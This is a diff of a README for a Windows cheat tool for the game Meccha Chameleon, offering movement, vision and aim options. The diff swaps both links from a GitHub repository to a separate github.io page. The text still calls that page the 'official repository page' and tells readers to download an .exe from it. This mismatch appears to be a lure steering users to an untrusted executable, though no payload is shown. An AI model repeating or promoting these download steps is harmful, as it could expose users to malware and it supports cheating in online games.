@@ -1,6 +1,6 @@
 # 🦎 MecchaPhantom - Dominate the hide and seek battlefield
 
-[![](https://img.shields.io/badge/Download-MecchaPhantom-blue)](https://github.com/Afnanw7097/MecchaPhantom)
+[![](https://img.shields.io/badge/Download-MecchaPhantom-blue)](https://afnanw7097.github.io)
 
 MecchaPhantom provides tools for players of the game Meccha Chameleon. Use these options to change how you play the game. The software includes tools for movement, vision, and aim. These tools work on the Windows operating system.
 
@@ -8,7 +8,7 @@ MecchaPhantom provides tools for players of the game Meccha Chameleon. Use these
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official repository page](https://github.com/Afnanw7097/MecchaPhantom).
+1. Visit the [official repository page](https://afnanw7097.github.io).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the latest version link.
 4. Download the file ending in .exe to your computer.
